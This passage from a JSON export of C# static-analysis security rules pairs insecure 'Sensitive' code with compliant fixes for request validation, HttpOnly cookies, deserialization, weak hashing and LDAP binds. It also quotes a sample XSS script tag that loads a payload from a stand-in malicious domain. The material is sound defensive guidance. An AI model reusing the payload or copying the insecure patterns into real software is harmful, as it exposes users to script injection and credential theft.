        "htmlDesc": "<p>ASP.NET 1.1+ comes with a feature called <em>Request Validation</em>, preventing the server to accept content containing un-encoded HTML. This\nfeature comes as a first protection layer against Cross-Site Scripting (XSS) attacks and act as a simple Web Application Firewall (WAF) rejecting\nrequests potentially containing malicious content.</p>\n<p>While this feature is not a silver bullet to prevent all XSS attacks, it helps to catch basic ones. It will for example prevent <code>&lt;script\ntype=\"text/javascript\" src=\"https://malicious.domain/payload.js\"&gt;</code> to reach your Controller.</p>\n<p>Note: <em>Request Validation</em> feature being only available for ASP.NET, no Security Hotspot is raised on ASP.NET Core applications.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the developer doesn’t know the impact to deactivate the Request Validation feature </li>\n  <li> the web application accepts user-supplied data </li>\n  <li> all user-supplied data are not validated </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Activate the Request Validation feature for all HTTP requests </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>At Controller level:</p>\n<pre>\n[ValidateInput(false)]\npublic ActionResult Welcome(string name)\n{\n  ...\n}\n</pre>\n<p>At application level, configured in the Web.config file:</p>\n<pre>\n&lt;configuration&gt;\n   &lt;system.web&gt;\n      &lt;pages validateRequest=\"false\" /&gt;\n      ...\n      &lt;httpRuntime requestValidationMode=\"0.0\" /&gt;\n   &lt;/system.web&gt;\n&lt;/configuration&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<p>At Controller level:</p>\n<pre>\n[ValidateInput(true)]\npublic ActionResult Welcome(string name)\n{\n  ...\n}\n</pre>\n<p>or</p>\n<pre>\npublic ActionResult Welcome(string name)\n{\n  ...\n}\n</pre>\n<p>At application level, configured in the Web.config file:</p>\n<pre>\n&lt;configuration&gt;\n   &lt;system.web&gt;\n      &lt;pages validateRequest=\"true\" /&gt;\n      ...\n      &lt;httpRuntime requestValidationMode=\"4.5\" /&gt;\n   &lt;/system.web&gt;\n&lt;/configuration&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.httpruntimesection.requestvalidationmode?view=netframework-4.8\">HttpRuntimeSection.RequestValidationMode Property</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/ASP-NET_Request_Validation\">OWASP ASP.NET Request Validation</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">OWASP Cheat Sheet</a> - XSS\n  Prevention Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S3330": {
        "name": "Creating cookies without the \"HttpOnly\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will\nbe able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer\nto decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target\nthe theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS\nvulnerability to steal session-cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>\n  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /\n  sensitive-security cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>When the <code>HttpCookie.HttpOnly</code> property is set to <code>false</code> then the cookie can be accessed by client side code:</p>\n<pre>\nHttpCookie myCookie = new HttpCookie(\"Sensitive cookie\");\nmyCookie.HttpOnly = false; // Sensitive: this cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<p>The <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcookie.httponly?view=netframework-4.8\">default value</a> of\n<code>HttpOnly</code> flag is <code>false</code>, unless overwritten by an application’s configuration file:</p>\n<pre>\nHttpCookie myCookie = new HttpCookie(\"Sensitive cookie\");\n// Sensitive: this cookie is created without the httponly flag  (by default set to false) and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<h2>Compliant Solution</h2>\n<p>Set the <code>HttpCookie.HttpOnly</code> property to <code>true</code>:</p>\n<pre>\nHttpCookie myCookie = new HttpCookie(\"Sensitive cookie\");\nmyCookie.HttpOnly = true; // Compliant: the sensitive cookie is protected against theft thanks to the HttpOnly property set to true (HttpOnly = true)\n</pre>\n<p>Or change the default flag values for the whole application by editing the <a\nhref=\"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262(v=vs.100)\">Web.config configuration file</a>:</p>\n<pre>\n&lt;httpCookies httpOnlyCookies=\"true\" requireSSL=\"true\" /&gt;\n</pre>\n<ul>\n  <li> the <code>requireSSL</code> attribute corresponds programmatically to the <code>Secure</code> field. </li>\n  <li> the <code>httpOnlyCookies</code> attribute corresponds programmatically to the <code>httpOnly</code> field. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/HttpOnly\">OWASP HttpOnly</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1004\">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE\">HTTPONLY_COOKIE</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "csharpsquid:S5766": {
        "name": "Deserializing objects without performing data validation is security-sensitive",
        "htmlDesc": "<p>Deserialization process extracts data from the serialized representation of an object and reconstruct it directly, without calling constructors.\nThus, data validation implemented in constructors can be bypassed if serialized objects are controlled by an attacker.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The data validation implemented in constructors enforces a relevant security check. </li>\n  <li> Objects instantiated via deserialization don’t run the same security checks as the ones executed when objects are created through constructors.\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> At the end of the deserialization process it is recommended to perform the same validation checks as the ones performed in constructors,\n  especially when the serialized object can be controlled by an attacker. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>When a <code>serializable</code> class doesn’t inherit from <a\nhref=\"https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable?view=netframework-4.8\">ISerializable</a> or <a\nhref=\"https://docs.microsoft.com/fr-fr/dotnet/api/system.runtime.serialization.ideserializationcallback?view=netframework-4.8\">IDeserializationCallback</a>\ntypes and has a constructor using its parameters in conditions:</p>\n<pre>\n[Serializable]\npublic class InternalUrl\n{\n    private string url;\n\n    public InternalUrl(string tmpUrl) // Sensitive\n    {\n       if(!tmpUrl.StartsWith(\"http://localhost/\")) // there is some input validation\n       {\n          url= \"http://localhost/default\";\n       }\n       else\n       {\n          url= tmpUrl;\n       }\n    }\n}\n</pre>\n<p>When a class inherit from <a\nhref=\"https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable?view=netframework-4.8\">ISerializable</a> type, has a\nregular constructor using its parameters in conditions, but doesn’t perform the same validation after deserialization:</p>\n<pre>\n[Serializable]\npublic class InternalUrl : ISerializable\n{\n    private string url;\n\n    public InternalUrl(string tmpUrl) // Sensitive\n    {\n        if(!tmpUrl.StartsWith(\"http://localhost/\")) // there is some input validation\n        {\n            url= \"http://localhost/default\";\n        }\n        else\n        {\n            url= tmpUrl;\n        }\n    }\n\n    // special constructor used during deserialization\n    protected InternalUrl(SerializationInfo info, StreamingContext context) // Sensitive\n    {\n       url= (string) info.GetValue(\"url\", typeof(string));\n       // the same validation as seen in the regular constructor is not performed\n     }\n\n    void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)\n    {\n        info.AddValue(\"url\", url);\n    }\n}\n</pre>\n<p>When a class inherit from <a\nhref=\"https://docs.microsoft.com/fr-fr/dotnet/api/system.runtime.serialization.ideserializationcallback?view=netframework-4.8\">IDeserializationCallback</a>\ntype, has a constructor using its parameters in conditions but the <code>IDeserializationCallback.OnDeserialization</code> method doesn’t perform any\nconditional checks:</p>\n<pre>\n[Serializable]\npublic class InternalUrl : IDeserializationCallback\n{\n    private string url;\n\n    public InternalUrl(string tmpUrl) // Sensitive\n    {\n        if(!tmpUrl.StartsWith(\"http://localhost/\")) // there is some input validation\n        {\n            url= \"http://localhost/default\";\n        }\n        else\n        {\n            url= tmpUrl;\n        }\n    }\n\n    void IDeserializationCallback.OnDeserialization(object sender) // Sensitive\n    {\n       // the same validation as seen in the constructor is not performed\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>When using <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable?view=netframework-4.8\">ISerializable</a>\ntype to control deserialization, perform the same checks inside regular constructors than in the special constructor <code>SerializationInfo info,\nStreamingContext context</code> used during deserialization:</p>\n<pre>\n[Serializable]\npublic class InternalUrl : ISerializable\n{\n    private string url;\n\n    public InternalUrl(string tmpUrl)\n    {\n        if(!tmpUrl.StartsWith(\"http://localhost/\")) // there is some input validation\n        {\n            url= \"http://localhost/default\";\n        }\n        else\n        {\n            url= tmpUrl;\n        }\n    }\n\n    // special constructor used during deserialization\n    protected InternalUrl(SerializationInfo info, StreamingContext context)\n    {\n       string tmpUrl= (string) info.GetValue(\"url\", typeof(string));\n\n       if(!tmpUrl.StartsWith(\"http://localhost/\") { // Compliant\n          url= \"http://localhost/default\";\n       }\n       else {\n          url= tmpUrl;\n       }\n     }\n\n    void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)\n    {\n        info.AddValue(\"url\", url);\n    }\n}\n</pre>\n<p>When using <a\nhref=\"https://docs.microsoft.com/fr-fr/dotnet/api/system.runtime.serialization.ideserializationcallback?view=netframework-4.8\">IDeserializationCallback</a>\ntype to control deserialization, perform the same checks inside regular constructors than after deserialization with\n<code>IDeserializationCallback.OnDeserialization</code> method:</p>\n<pre>\n[Serializable]\npublic class InternalUrl : IDeserializationCallback\n{\n    private string url;\n\n    public InternalUrl(string tmpUrl)\n    {\n       if(!tmpUrl.StartsWith(\"http://localhost/\")) // there is some input validation\n       {\n          url= \"http://localhost/default\";\n       }\n       else\n       {\n          url= tmpUrl;\n       }\n    }\n\n    void IDeserializationCallback.OnDeserialization(object sender) // Compliant\n    {\n        if(!url.StartsWith(\"http://localhost/\"))\n        {\n            url= \"http://localhost/default\";\n        }\n        else\n        {\n        }\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/dotnet/framework/misc/security-and-serialization\">docs.microsoft.com</a> - security-and-serialization\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S2257": {
        "name": "Using non-standard cryptographic algorithms is security-sensitive",
        "htmlDesc": "<p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has\nbeen protected. Standard algorithms like <code>AES</code>, <code>RSA</code>, <code>SHA</code>, …​ should be used instead.</p>\n<p>This rule tracks custom implementation of these types from <code>System.Security.Cryptography</code> namespace:</p>\n<ul>\n  <li> <code>AsymmetricAlgorithm</code> </li>\n  <li> <code>AsymmetricKeyExchangeDeformatter</code> </li>\n  <li> <code>AsymmetricKeyExchangeFormatter</code> </li>\n  <li> <code>AsymmetricSignatureDeformatter</code> </li>\n  <li> <code>AsymmetricSignatureFormatter</code> </li>\n  <li> <code>DeriveBytes</code> </li>\n  <li> <code>HashAlgorithm</code> </li>\n  <li> <code>ICryptoTransform</code> </li>\n  <li> <code>SymmetricAlgorithm</code> </li>\n</ul>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a standard algorithm instead of creating a custom one. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic class CustomHash : HashAlgorithm // Noncompliant\n{\n    private byte[] result;\n\n    public override void Initialize() =&gt; result = null;\n    protected override byte[] HashFinal() =&gt; result;\n\n    protected override void HashCore(byte[] array, int ibStart, int cbSize) =&gt;\n        result ??= array.Take(8).ToArray();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSHA256 mySHA256 = SHA256.Create()\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST\">MessageDigest is Custom</a>\n  </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S4433": {
        "name": "LDAP connections should be authenticated",
        "htmlDesc": "<p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The\n<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>\n<ul>\n  <li> <em>Anonymous</em> Authentication </li>\n  <li> <em>Unauthenticated</em> Authentication </li>\n  <li> <em>Name/Password</em> Authentication </li>\n</ul>\n<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing\ncredentials.</p>\n<h2>Why is this an issue?</h2>\n<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do\nnot provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted\ndirectory.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact\nvaries depending on the permission obtained on the directory and the type of data it stores.</p>\n<h4>Authentication bypass</h4>\n<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data\nsuch as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the\naffected directory as an identity provider.</p>\n<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>\n<h4>Sensitive information leak</h4>\n<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces\nof information.</p>\n<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to\nperform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>\n<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements\nin some countries. For example, this kind of security event would go against the European GDPR law.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple\nauthentication mechanism.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nDirectoryEntry myDirectoryEntry = new DirectoryEntry(adPath);\nmyDirectoryEntry.AuthenticationType = AuthenticationTypes.None; // Noncompliant\n\nDirectoryEntry myDirectoryEntry = new DirectoryEntry(adPath, \"u\", \"p\", AuthenticationTypes.None); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nDirectoryEntry myDirectoryEntry = new DirectoryEntry(myADSPath); // Compliant; default DirectoryEntry.AuthenticationType property value is \"Secure\" since .NET Framework 2.0\n\nDirectoryEntry myDirectoryEntry = new DirectoryEntry(myADSPath, \"u\", \"p\", AuthenticationTypes.Secure);\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://datatracker.ietf.org/doc/html/rfc4513#section-5\">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication\n  Methods and Security Mechanisms</a> - Bind operations </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/521\">CWE-521 - Weak Password Requirements</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nvar hashProvider1 = new MD5CryptoServiceProvider(); // Sensitive\nvar hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName(\"MD5\"); // Sensitive\nvar hashProvider3 = new SHA1Managed(); // Sensitive\nvar hashProvider4 = HashAlgorithm.Create(\"SHA1\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvar hashProvider1 = new SHA512Managed(); // Compliant\nvar hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName(\"SHA512Managed\"); // Compliant\nvar hashProvider3 = HashAlgorithm.Create(\"SHA512Managed\"); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S4792": {
        "name": "Configuring loggers is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285\">CVE-2018-0285</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127\">CVE-2000-1127</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113\">CVE-2017-15113</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742\">CVE-2015-5742</a> </li>\n</ul>\n<p>Logs are useful before, during and after a security incident.</p>\n<ul>\n  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it\n  is the first step to prevent an attack from ever happening. </li>\n  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>\n</ul>\n<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information\nlogged and how they are logged.</p>\n<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives\n  access to them. </li>\n  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>\n  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the\n  user can perform the action as many times as he/she wants. </li>\n  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)\n  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>\n  <li> the logs are only stored locally instead of being backuped or replicated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Check that your production deployment doesn’t have its loggers in \"debug\" mode as it might write sensitive information in logs. </li>\n  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>\n  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the\n  hostname. </li>\n  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the\n  impact is known and limited. </li>\n  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the\n  service are secure too. </li>\n  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control\n  the logged information. An attacker could just repeat a logged action many times. </li>\n</ul>\n<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your\nlogs:</p>\n<ul>\n  <li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user\n  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li>\n  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user\n  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example\n  use all your storage space or compromise your log indexing service. </li>\n  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as\n  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>\n  <li> Monitor the logs for any suspicious activity. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><strong>.Net Core</strong>: configure programmatically</p>\n<pre>\nusing System;\nusing System.Collections;\nusing System.Collections.Generic;\nusing Microsoft.AspNetCore.Builder;\nusing Microsoft.AspNetCore.Hosting;\nusing Microsoft.Extensions.Configuration;\nusing Microsoft.Extensions.DependencyInjection;\nusing Microsoft.Extensions.Logging;\nusing Microsoft.Extensions.Options;\nusing Microsoft.AspNetCore;\n\nnamespace MvcApp\n{\n    public class ProgramLogging\n    {\n        public static IWebHostBuilder CreateWebHostBuilder(string[] args) =&gt;\n            WebHost.CreateDefaultBuilder(args)\n                .ConfigureLogging((hostingContext, logging) =&gt; // Sensitive\n                {\n                    // ...\n                })\n                .UseStartup&lt;StartupLogging&gt;();\n    }\n\n    public class StartupLogging\n    {\n        public void ConfigureServices(IServiceCollection services)\n        {\n            services.AddLogging(logging =&gt; // Sensitive\n            {\n                // ...\n            });\n        }\n\n        public void Configure(IApplicationBuilder app, IHostingEnvironment env, ILoggerFactory loggerFactory)\n        {\n            IConfiguration config = null;\n            LogLevel level = LogLevel.Critical;\n            Boolean includeScopes = false;\n            Func&lt;string,Microsoft.Extensions.Logging.LogLevel,bool&gt; filter = null;\n            Microsoft.Extensions.Logging.Console.IConsoleLoggerSettings consoleSettings = null;\n            Microsoft.Extensions.Logging.AzureAppServices.AzureAppServicesDiagnosticsSettings azureSettings = null;\n            Microsoft.Extensions.Logging.EventLog.EventLogSettings eventLogSettings = null;\n\n            // An issue will be raised for each call to an ILoggerFactory extension methods adding loggers.\n            loggerFactory.AddAzureWebAppDiagnostics(); // Sensitive\n            loggerFactory.AddAzureWebAppDiagnostics(azureSettings); // Sensitive\n            loggerFactory.AddConsole(); // Sensitive\n            loggerFactory.AddConsole(level); // Sensitive\n            loggerFactory.AddConsole(level, includeScopes); // Sensitive\n            loggerFactory.AddConsole(filter); // Sensitive\n            loggerFactory.AddConsole(filter, includeScopes); // Sensitive\n            loggerFactory.AddConsole(config); // Sensitive\n            loggerFactory.AddConsole(consoleSettings); // Sensitive\n            loggerFactory.AddDebug(); // Sensitive\n            loggerFactory.AddDebug(level); // Sensitive\n            loggerFactory.AddDebug(filter); // Sensitive\n            loggerFactory.AddEventLog(); // Sensitive\n            loggerFactory.AddEventLog(eventLogSettings); // Sensitive\n            loggerFactory.AddEventLog(level); // Sensitive\n            loggerFactory.AddEventSourceLogger(); // Sensitive\n\n            IEnumerable&lt;ILoggerProvider&gt; providers = null;\n            LoggerFilterOptions filterOptions1 = null;\n            IOptionsMonitor&lt;LoggerFilterOptions&gt; filterOptions2 = null;\n\n            LoggerFactory factory = new LoggerFactory(); // Sensitive\n            new LoggerFactory(providers); // Sensitive\n            new LoggerFactory(providers, filterOptions1); // Sensitive\n            new LoggerFactory(providers, filterOptions2); // Sensitive\n        }\n    }\n}\n</pre>\n<p><strong>Log4Net</strong></p>\n<pre>\nusing System;\nusing System.IO;\nusing System.Xml;\nusing log4net.Appender;\nusing log4net.Config;\nusing log4net.Repository;\n\nnamespace Logging\n{\n    class Log4netLogging\n    {\n        void Foo(ILoggerRepository repository, XmlElement element, FileInfo configFile, Uri configUri, Stream configStream,\n        IAppender appender, params IAppender[] appenders) {\n            log4net.Config.XmlConfigurator.Configure(repository); // Sensitive\n            log4net.Config.XmlConfigurator.Configure(repository, element); // Sensitive\n            log4net.Config.XmlConfigurator.Configure(repository, configFile); // Sensitive\n            log4net.Config.XmlConfigurator.Configure(repository, configUri); // Sensitive\n            log4net.Config.XmlConfigurator.Configure(repository, configStream); // Sensitive\n            log4net.Config.XmlConfigurator.ConfigureAndWatch(repository, configFile); // Sensitive\n\n            log4net.Config.DOMConfigurator.Configure(); // Sensitive\n            log4net.Config.DOMConfigurator.Configure(repository); // Sensitive\n            log4net.Config.DOMConfigurator.Configure(element); // Sensitive\n            log4net.Config.DOMConfigurator.Configure(repository, element); // Sensitive\n            log4net.Config.DOMConfigurator.Configure(configFile); // Sensitive\n            log4net.Config.DOMConfigurator.Configure(repository, configFile); // Sensitive\n            log4net.Config.DOMConfigurator.Configure(configStream); // Sensitive\n            log4net.Config.DOMConfigurator.Configure(repository, configStream); // Sensitive\n            log4net.Config.DOMConfigurator.ConfigureAndWatch(configFile); // Sensitive\n            log4net.Config.DOMConfigurator.ConfigureAndWatch(repository, configFile); // Sensitive\n\n            log4net.Config.BasicConfigurator.Configure(); // Sensitive\n            log4net.Config.BasicConfigurator.Configure(appender); // Sensitive\n            log4net.Config.BasicConfigurator.Configure(appenders); // Sensitive\n            log4net.Config.BasicConfigurator.Configure(repository); // Sensitive\n            log4net.Config.BasicConfigurator.Configure(repository, appender); // Sensitive\n            log4net.Config.BasicConfigurator.Configure(repository, appenders); // Sensitive\n        }\n    }\n}\n</pre>\n<p><strong>NLog</strong>: configure programmatically</p>\n<pre>\nnamespace Logging\n{\n    class NLogLogging\n    {\n        void Foo(NLog.Config.LoggingConfiguration config) {\n            NLog.LogManager.Configuration = config; // Sensitive, this changes the logging configuration.\n        }\n    }\n}\n</pre>\n<p><strong>Serilog</strong></p>\n<pre>\nnamespace Logging\n{\n    class SerilogLogging\n    {\n        void Foo() {\n            new Serilog.LoggerConfiguration(); // Sensitive\n        }\n    